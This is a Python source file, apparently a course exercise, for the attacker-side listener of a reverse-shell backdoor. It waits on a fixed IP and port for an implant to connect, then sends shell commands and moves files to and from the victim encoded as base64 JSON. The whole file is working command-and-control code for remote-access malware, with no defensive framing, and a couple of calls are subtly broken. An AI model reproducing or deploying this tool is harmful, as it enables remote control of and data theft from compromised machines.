import socket
import simplejson
import base64


class SocketListener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # make it reusable to continue listening
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
        my_listener.bind((ip, port))
        my_listener.listen()
        print("Listening...")
        (self.my_connection, my_addr) = my_listener.accept()
        print("Connected to " + str(my_addr))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit(0)

        return self.json_recv()

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "Download saved to " + path

    def get_file_contents(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            # used raw_input bc tht how it done in python 2
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    fileContent = self.get_file_contents(command_input[1])
                    command_input.append(fileContent)

                command_out = self.command_execution(command_input)

                if command_input[0] == "download" and "ERROR" not in command_out:
                    command_out = self.save_file(command_input[1],command_out)
            except Exception:
                command_out = "ERROR!\n"

            print(command_out)


my_socket_listener = SocketListener("33.33.33.6", 8080)
my_socket_listener.start_listener()
